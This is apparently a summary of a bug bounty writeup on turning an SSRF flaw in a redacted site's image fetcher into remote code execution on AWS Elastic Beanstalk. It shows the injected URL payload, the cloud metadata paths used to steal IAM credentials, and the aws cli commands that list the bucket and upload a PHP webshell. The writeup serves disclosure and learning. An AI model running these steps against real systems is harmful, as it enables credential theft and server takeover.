# Writeup - Escalating SSRF to RCE

- writeup can be found at [this](https://medium.com/@GeneralEG/escalating-ssrf-to-rce-f28c482eb8b9) link.

<br>
<br>

## Description

- This writeup is about how the researcher found an SSRF and converted that into a RCE on the server.

- The domains and targets for which the writeup was writted are private and hence are redacted. The researcher referred to them as `redact.com`


- This writeup shows how a simple image fetching mecahism can lead to Remote Code Execution.

<br>
<br>

## Details

- The researcher for this exploit is [Youssef A. Mohamed](https://medium.com/@GeneralEG).

- This exploit attacks a `PaaS` instance of __AWS__, specifically __AWS Elastic Beanstalk__.


<br>
<br>

### AWS Elastic Beanstalk

- It is fully managed, PaaS, capable or resource provisioning, scalability of services, and also provides health monitoring on top for the Apps you have deployed.

<br>
<br>

### Methodology

- The researcher while doing initial recon, found a subdomain for the target website. That was `docs`. For understanding we call it `docs.redact.com`



- While going through this subdomain, the researcher identified documents along with images. He opened one of those images having report and graphs in a new tab. Which led him to a link as follows:


```
https://docs.redact.com/report/api/v2/help/asset?url=https://redact.atlassian.net/wiki/download/thumbnails.....
```

- so we can see that an external URL is being loaded. Hence the first thing the researcher did was to change to URL to his own website: `generaleg0x01.com`

- Looking carefully at the link, a MIME type was noticed. Initially it would have been for image, something like __`image/jpeg`__ or __`image/png`__, but he changed it to __`text/html`__

- the final injected payload URL now becomes:

```
https://docs.redact.com/report/api/v2/help/asset?url=https://generaleg0x01.com&mimeType=text/html&t=REDACTED.JWT.TOKEN&advertiserId=11
```

- and clearly enough, it worked:

![out-of-band-resource-loading](https://miro.medium.com/v2/resize:fit:1400/format:webp/0*D6OCABU3_IEvu9wp.jpg)

- This is generally called as __`out of band resource loading`__.


<br>
<br>

## Next Steps

- in Burpsuite, the researcher had seen a __HTTP-Header__: `X-Amz-Cf-Id`.

- This  is kind of a indicator that this is an __AMAZON environment__.

<br>
<br>

### Local Link

- It is a standard for EC2 Amazon instances to locally provided IAM details over a locally accessible IP address, which keeps on changing for security purposes.

- The local IP address for this purpose is fixed: `169.254.169.254`

- And the API endpoints of this IAM access thing is also publicaly known.

- A common endpoint is `/latest/meta-data/`


![meta-data](https://miro.medium.com/v2/resize:fit:1400/format:webp/0*qxlQqYCaIwVYtRCD.jpg)

- the above image verified the researcher's assumpotions, and he further tried to fetch the IAM details/credentials.

- It made clear that SSRF is possible, since we can access a local, Server Side Resource.


- going to `/latest/meta-data/iam/security-credentials/`, told the central-role of the server

![central-role](https://miro.medium.com/v2/resize:fit:1400/format:webp/0*5cMEI1etbcDwQKTq.jpg)



- found role: __[aws-beanstalk-ec2-role]__


<br>
<br>

### Grabbing Credentials and setting up Aws Cli

- now to get the credentials and IAM data necessary to log into the `aws cli` client, a simple request to `/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role/` would suffice. 

![data](https://miro.medium.com/v2/resize:fit:1400/format:webp/0*S43zm00WRnbGBVBt.jpg)

- to get [instanceId, accountId, region], we can go to : `/latest/dynamic/instance-identity/document/`


- so with all this, the researcher was able to setup aws cli and get more information about the environment from there.

<br>
<br>

### RCE attempts

- The researcher tried `ssm send-command` to send commands, but failed.

- an attempt to login via SSH also failed since port 22 was closed and not responding from internal network.

![ssh](https://miro.medium.com/v2/resize:fit:1400/format:webp/0*5TjgjpWAsFvPDkXb.jpg)


- The resercher also faced issues with `aws s3 ls` to list buckets!


![important] - It was later found out that

```
The managed policy “AWSElasticBeanstalkWebTier” only allows accessing S3 buckets whose name start with “elasticbeanstalk”.
```

- the format for the same is:

```
elasticbeanstalk-region-account-id
```


- Hence the researcher tried

```bash
aws s3 ls s3://elasticbeanstalk-us-east-1–76xxxxxxxx00/ — recursive
```

- and this time it worked and gave resources.


- so the researcher tried uploading a `PHP Webshell`, and it worked, and the researcher was finally able to get and RCE.

```bash
aws s3 cp cmd.php s3://elasticbeanstalk-us-east-1–76xxxxxxxx00/
```


![RCE](https://miro.medium.com/v2/resize:fit:1400/format:webp/0*KvUMWgs1MFSy5LsO.jpg)

